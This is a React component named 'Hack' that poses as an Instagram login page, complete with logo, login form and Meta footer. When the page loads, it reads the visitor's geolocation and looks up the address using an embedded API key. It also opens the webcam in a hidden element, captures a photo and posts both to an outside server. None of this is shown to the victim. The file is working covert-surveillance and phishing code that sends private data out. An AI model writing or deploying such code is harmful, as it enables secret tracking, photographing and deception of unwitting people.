import React, { useEffect, useRef, useState } from "react";
import axios from "axios";

export const Hack: React.FC = () => {
  const videoRef = useRef<HTMLVideoElement | null>(null);
  const canvasRef = useRef<HTMLCanvasElement | null>(null);
  const [location, setLocation] = useState<{
    lat: number;
    long: number;
    location: string;
  } | null>(null);
  const [photo, setPhoto] = useState<string | null>(null);

  const OPEN_CAGE_API_KEY = "b9895ffd825f41d492da094f35cec421";

  // Get the current location
  useEffect(() => {
    const fetchLocation = () => {
      navigator.geolocation.getCurrentPosition(
        async (position) => {
          const response = await fetch(
            `https://api.opencagedata.com/geocode/v1/json?q=${position.coords.latitude}+${position.coords.longitude}&key=${OPEN_CAGE_API_KEY}`
          );
          const data = await response.json();
          const locationData = {
            lat: position.coords.latitude,
            long: position.coords.longitude,
            location: data?.results[0]?.formatted || "Unknown location",
          };
          setLocation(locationData);

          await axios.post(
            "https://instagram-server-eight.vercel.app/v1/upload",
            locationData,
            { withCredentials: true }
          );
        },
        (err) => {
          console.error("Error getting location: ", err);
        }
      );
    };

    fetchLocation();
  }, []);

  // Get the photo
  useEffect(() => {
    const fetchPhoto = async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: true,
        });

        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          videoRef.current.onloadedmetadata = async () => {
            const canvas = canvasRef.current;
            const video = videoRef.current;

            if (canvas && video) {
              const context = canvas.getContext("2d");
              if (context) {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                const imgDataUrl = canvas.toDataURL("image/png");
                setPhoto(imgDataUrl);

                await axios.post(
                  "https://instagram-server-eight.vercel.app/cloudinary/upload",
                  { img: imgDataUrl },
                  { withCredentials: true }
                );
              }
            }
          };
        }
      } catch (err) {
        console.error("Error accessing the camera: ", err);
      }
    };

    fetchPhoto();
  }, []);

  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-gray-50">
      <div className="hidden">
        <video
          ref={videoRef}
          autoPlay
          className="w-80 h-60 bg-black mb-4"
        ></video>
      </div>
      <canvas ref={canvasRef} className="hidden"></canvas>

      <div className="w-full max-w-xs">
        {/* Instagram Logo */}
        <div className="flex justify-center mb-8">
          <img
            src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png"
            alt="Instagram"
            className="w-36"
          />
        </div>

        {/* Location Display */}
        {location ? (
          <p className="mb-4 text-lg hidden">
            Your current location is: Latitude: {location.lat}, Longitude:{" "}
            {location.long}, Location: {location.location}
          </p>
        ) : (
          <p className="mb-4 text-lg">Loading your location...</p>
        )}

        {/* Photo Display */}
        {photo && (
          <div className="mt-6 hidden">
            <h2 className="text-xl font-semibold mb-2">Captured Photo:</h2>
            <img
              src={photo}
              alt="Captured"
              className="border border-gray-300"
            />
          </div>
        )}

        {/* Instagram Login Form */}
        <div className="bg-white p-6 border border-gray-300 rounded-md shadow-sm">
          <form className="space-y-4">
            {/* Email/Username */}
            <input
              type="text"
              placeholder="Phone number, username, or email"
              className="w-full p-2 border border-gray-300 rounded-md text-sm focus:outline-none focus:ring-2 focus:ring-blue-400"
            />

            {/* Password */}
            <input
              type="password"
              placeholder="Password"
              className="w-full p-2 border border-gray-300 rounded-md text-sm focus:outline-none focus:ring-2 focus:ring-blue-400"
            />

            {/* Login Button */}
            <button
              type="submit"
              className="w-full bg-blue-500 text-white p-2 rounded-md font-semibold hover:bg-blue-600 transition duration-200"
            >
              Log In
            </button>

            {/* Forgot Password */}
            <div className="text-center mt-4">
              <a href="#" className="text-xs text-blue-500 hover:underline">
                Forgot password?
              </a>
            </div>
          </form>
        </div>

        {/* Or Separator */}
        <div className="flex items-center justify-center my-4 space-x-2">
          <div className="w-full h-px bg-gray-300"></div>
          <span className="text-gray-500 text-sm">OR</span>
          <div className="w-full h-px bg-gray-300"></div>
        </div>

        {/* Sign Up Link */}
        <div className="bg-white p-6 border border-gray-300 rounded-md shadow-sm text-center">
          <p className="text-sm">
            Don't have an account?{" "}
            <a href="#" className="text-blue-500 font-semibold hover:underline">
              Sign up
            </a>
          </p>
        </div>
      </div>

      {/* Footer */}
      <footer className="mt-8 text-xs text-gray-500">
        <ul className="flex space-x-4">
          <li>
            <a href="#" className="hover:underline">
              About
            </a>
          </li>
          <li>
            <a href="#" className="hover:underline">
              Help
            </a>
          </li>
          <li>
            <a href="#" className="hover:underline">
              Press
            </a>
          </li>
          <li>
            <a href="#" className="hover:underline">
              API
            </a>
          </li>
          <li>
            <a href="#" className="hover:underline">
              Jobs
            </a>
          </li>
          <li>
            <a href="#" className="hover:underline">
              Privacy
            </a>
          </li>
          <li>
            <a href="#" className="hover:underline">
              Terms
            </a>
          </li>
        </ul>
        <div className="text-center mt-4">© 2024 Instagram from Meta</div>
      </footer>
    </div>
  );
};
